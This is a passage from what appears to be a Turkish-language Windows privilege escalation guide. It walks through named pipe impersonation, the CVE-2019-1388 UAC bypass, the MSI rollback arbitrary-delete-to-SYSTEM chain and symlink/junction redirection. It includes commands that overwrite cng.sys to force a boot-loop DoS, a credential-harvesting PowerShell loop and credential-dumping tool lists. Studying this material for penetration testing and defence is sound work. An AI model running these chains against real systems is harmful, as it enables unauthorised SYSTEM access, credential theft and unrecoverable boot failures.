Farklı izin seviyeleriyle (yalnızca tam erişim değil) devralınan process ve thread'lerin daha fazla açık handle'ını nasıl test edip abuse edeceğinize dair daha kapsamlı bir açıklama için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipe** olarak adlandırılan paylaşılan memory segment'leri, process'ler arasında iletişim ve veri aktarımı sağlar.

Windows, ilgisiz process'lerin farklı network'ler üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak belirlendiği bir client/server mimarisine benzer.

Bir **client** bir pipe üzerinden veri gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **privileged process**'i tespit etmek, oluşturduğunuz pipe ile etkileşime girdiğinde o process'in kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sağlar. Böyle bir saldırının nasıl gerçekleştirileceğine dair yararlı kılavuzlara [**buradan**](named-pipe-client-impersonation.md) ve [**buradan**](#from-high-integrity-to-system) ulaşabilirsiniz.

Ayrıca aşağıdaki tool, **burp gibi bir tool ile named pipe iletişimini intercept etmenizi** sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc bulmak için tüm pipe'ları listeleyip görmenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode'daki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) endpoint'ini expose eder. Remote authenticated bir client, mailslot tabanlı async event yolunu abuse ederek `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir file'a yönelik rastgele bir **4-byte write** işlemine dönüştürebilir; ardından Telephony admin haklarını elde edip service olarak rastgele bir DLL yükleyebilir. Tam akış:

- `pszDomainUser`, yazılabilir mevcut bir path olarak ayarlanmış şekilde `ClientAttach` → service, `CreateFileW(..., OPEN_EXISTING)` aracılığıyla bu dosyayı açar ve async event write işlemleri için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministic write işlemlerini tekrarlamak için unregister/shutdown yapın.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL path'iyle `GetUIDllName` çağırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve attacker-controlled file'ları mevcut user olarak execute edebilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Bir user olarak shell elde ettiğinizde, **credential'ları command line üzerinde ileten** scheduled task'ler veya diğer process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Süreçlerden parola çalma

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu, aynı vulnerability ile aynı anda ayrıcalıkları yükseltmeyi ve UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level / UAC Bypass'e

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'leri** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik, exploit koduyla birlikte [**burada mevcuttur**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğinin abuse edilmesine dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü hijack etmek amacıyla kullanılacak bir **malicious MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; rollback dosyaları ise kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

Özetlenen teknik şu şekildedir:

1. **Stage 1 – Hijack için hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Step 1: MSI'ı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece bir **non-admin user** bunu çalıştırabilir.
- Yükleme işleminden sonra dosyaya ait bir **handle** açık tutun.

- Step 2: Kaldırma işlemini başlatın
- Aynı `.msi` dosyasını kaldırın.
- Kaldırma işlemi dosyaları `C:\Config.Msi` konumuna taşımaya ve bunları `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
- Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini tespit etmek için açık dosya **handle**'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Step 3: Custom Syncing
- `.msi`, şu işlevi gerçekleştiren bir **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında sinyal verir.
- Ardından kaldırma işlemine devam etmeden önce başka bir event üzerinde **wait** eder.

- Step 4: `.rbf` dosyasının silinmesini engelleyin
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu işlem dosyanın silinmesini **engeller**.
- Ardından kaldırma işleminin tamamlanabilmesi için geri sinyal gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Step 5: `.rbf` dosyasını manuel olarak silin
- `.rbf` dosyasını siz (saldırgan) manuel olarak silin.
- Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, **SYSTEM seviyesindeki arbitrary folder delete vulnerability**'yi tetikleyerek `C:\Config.Msi` klasörünü silin.

2. **Stage 2 – Rollback script'lerini kötü amaçlı olanlarla değiştirme**

- Step 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturun
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **weak DACLs** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` yetkisine sahip bir **handle**'ı açık tutun.

- Step 7: Başka bir yükleme çalıştırın
- `.msi` dosyasını şu ayarlarla tekrar yükleyin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
- Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Step 8: `.rbs` için izleme yapın
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü izlemek için `ReadDirectoryChangesW` kullanın.
- Dosya adını yakalayın.

- Step 9: Rollback öncesinde sync işlemi
- `.msi`, şu işlevi gerçekleştiren bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event'e sinyal gönderir.
- Ardından devam etmeden önce **wait** eder.

- Step 10: Weak ACL'yi yeniden uygulayın
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **strong ACLs**'yi yeniden uygular.
- Ancak hâlâ `WRITE_DAC` yetkisine sahip bir **handle**'ınız olduğundan **weak ACLs**'yi tekrar uygulayabilirsiniz.

> ACL'ler **yalnızca handle açılırken uygulanır**, bu nedenle klasöre hâlâ yazabilirsiniz.

- Step 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
- `.rbs` dosyasının üzerine, Windows'a şunları söyleyen sahte bir rollback script'i yazın:
- `.rbf` dosyanızı (kötü amaçlı DLL) **privileged location** içine geri yükleyin (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Kötü amaçlı **SYSTEM-level payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Step 12: Rollback'i tetikleyin
- Installer'ın devam etmesi için sync event'ine sinyal gönderin.
- Bir **type 19 custom action (`ErrorOut`)**, yüklemeyi bilinen bir noktada **kasten başarısız olacak** şekilde yapılandırılmıştır.
- Bu işlem **rollback'in başlamasına** neden olur.

- Step 13: SYSTEM DLL'nizi yükler
- Windows Installer:
- Kötü amaçlı `.rbs` dosyanızı okur.
- `.rbf` DLL'nizi hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir path içinde kötü amaçlı DLL'niz** bulunmaktadır.

- Final Step: SYSTEM kodunu çalıştırın
- Hijack ettiğiniz DLL'yi yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability yalnızca **arbitrary file deletion** işlemine izin veriyorsa?

**NTFS internals**'ı exploit edebilirsiniz: her klasörün şu adla gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **indeks meta verilerini** depolar.

Dolayısıyla bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* silme API'si çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriği Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosyaları/klasörleri silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa** ne olur?

1. Adım 1: Bir yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, ayrıcalıklı bir işlem `file1.txt` dosyasını silmeye çalıştığında **çalışmayı duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'i tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrol callback'inize devredilir.

4. Adım 4: Oplock callback içinde - silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
- Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i vaktinden önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS internal stream'i hedefler — bunu silmek klasörü siler.

5. Step 5: Oplock'i serbest bırakın
- SYSTEM process devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında şunu siler:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS'a

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak keyfi bir klasör oluşturmanıza** olanak tanıyan bir primitive'den yararlanın.

**Kritik bir Windows sürücüsünün** adıyla, örneğin aşağıdaki gibi bir **klasör** (dosya değil) oluşturun:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver'ı yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **çöker veya açılışı durdurur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Privileged log/backup paths + OM symlinks'ten arbitrary file overwrite / boot DoS'a

Bir **privileged service**, log'ları/exports'ları **writable config**'den okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek privileged write işlemini arbitrary overwrite işlemine dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu depolayan config'in attacker tarafından writable olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan bir privileged operation (log, export, report).

**Örnek chain**
1. Privileged log destination'ı elde etmek için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'in log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, privileged bir service'in yazma amacıyla açacağı tüm protected file'lar için genellenebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS hedefi hâline gelir.



## **High Integrity'den SYSTEM'e**

### **Yeni service**

Zaten bir High Integrity process çalıştırıyorsanız, **SYSTEM'e giden yol** yalnızca yeni bir service **oluşturup çalıştırarak** kolaylaşabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity process içerisinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
İlgili registry key'leri ve bir _.msi_ package'ın nasıl kurulacağı hakkında [daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privilege'larına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process içerisinde bulacaksınız), SeDebug privilege'ı ile **neredeyse her process'i** (protected process'ler hariç) **açabilecek**, process'in **token'ını kopyalayabilecek** ve bu token ile **arbitrary bir process oluşturabileceksiniz**.\
Bu technique genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan herhangi bir process'i seçer** (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri de bulabilirsiniz_).\
Önerilen technique'i uygulayan bir code [**örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique, meterpreter tarafından `getsystem` içerisinde privilege escalation gerçekleştirmek için kullanılır. Technique, **bir pipe oluşturup ardından bu pipe'a yazmak için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından, `SeImpersonate` privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını taklit edebilecek** ve SYSTEM privilege'larını elde edebilecektir.\
Name pipe'lar hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
Name pipe'ları kullanarak high integrity'den System'e nasıl geçileceğine dair [**bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir **dll'i hijack etmeyi** başarırsanız, bu permission'larla arbitrary code çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür privilege escalation için de kullanışlıdır; ayrıca **high integrity process'ten gerçekleştirilmesi çok daha kolaydır**, çünkü dll'leri yüklemek için kullanılan folder'lar üzerinde **write permission'larına** sahip olacaktır.\
**Dll hijacking hakkında daha fazla** [**buradan bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vector'lerini bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- yanlış yapılandırmaları ve hassas file'ları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı session bilgilerini çıkarır. Local ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credential'ları çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- toplanan password'ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofer'ı ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerability'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerability'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc'ten çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- birçok software'den credential'ları çıkarır (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# port'u**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmayı kontrol eder (github'da precompiled executable). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post temel alınarak oluşturulmuş tool'dur (düzgün çalışmak için accesschk erişimi gerektirmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmeniz gerekir ([bkz.](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host üzerinde kurulu .NET sürümünü görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetkileri yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - bir cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifre çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'u Takip Etmek: Kernel Gölgelerinde Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Zafiyeti](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Link. Windows'ta Symbolic Link'lerden Yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Chaining CLDFLT and DirectX Kernel Race Conditions for Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11'de Tam Okuma/Yazma Exploit Primitive'ı](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Keyfi Dosya Silmelerinden Yararlanarak Yetki Yükseltme ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İncelemek](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
